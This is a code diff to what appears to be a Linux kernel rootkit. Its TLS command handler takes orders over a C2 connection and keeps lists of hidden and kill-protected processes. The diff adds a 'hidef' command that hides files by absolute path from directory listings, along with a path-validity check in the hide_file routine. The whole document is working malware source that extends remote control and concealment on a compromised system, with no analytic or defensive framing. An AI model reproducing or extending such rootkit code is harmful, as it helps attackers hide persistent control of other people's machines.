@@ -320,6 +320,7 @@ void read_TLS(struct work_struct* work) {
     const char* unknown = "Unknown command\n";
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
+    const char* bad_file = "Invalid hidden file path\n";
 
     memset(buffer, 0, MAX_PAYLOAD);
     len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
@@ -370,7 +371,7 @@ void read_TLS(struct work_struct* work) {
         show();
         strcpy(buffer, "foobar");
         send_msg(svc->tls_socket, buffer, strlen("foobar"));
-        //Processes that need to be killed when they aren't hidden
+    //Processes that need to be killed when they aren't hidden
     } else if (memcmp("hidek", buffer, 5) == 0) {
         if (kstrtou16(buffer + 6, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
@@ -379,7 +380,16 @@ void read_TLS(struct work_struct* work) {
         }
         //Store the pid in the hidden proc list
         hidden_kill_procs[hidden_kill_count++] = tmp_port;
-        //Processes that can't be killed when they aren't hidden
+    //Hiding a file given an absolute path
+    } else if (memcmp("hidef", buffer, 5) == 0) {
+        if (hide_file(buffer + 6, hidden_files + hidden_file_count)) {
+            ++hidden_file_count;
+        } else {
+            strcpy(buffer, bad_file);
+            send_msg(svc->tls_socket, buffer, strlen(bad_file));
+            goto resched;
+        }
+    //Processes that can't be killed when they aren't hidden
     } else if (memcmp("hide", buffer, 4) == 0) {
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
             strcpy(buffer, bad_port);
@@ -661,6 +671,14 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     struct dir_context d = {
             .actor = rk_filldir_t,
     };
+    struct path p;
+
+    //Check if user input string is even a valid file path
+    if (kern_path(user_input, 0, &p)) {
+        kfree(user_dir);
+        kfree(user_file);
+        return false;
+    }
 
     strcpy(user_dir, user_input);
     memset(user_file, 0, strlen(user_input));
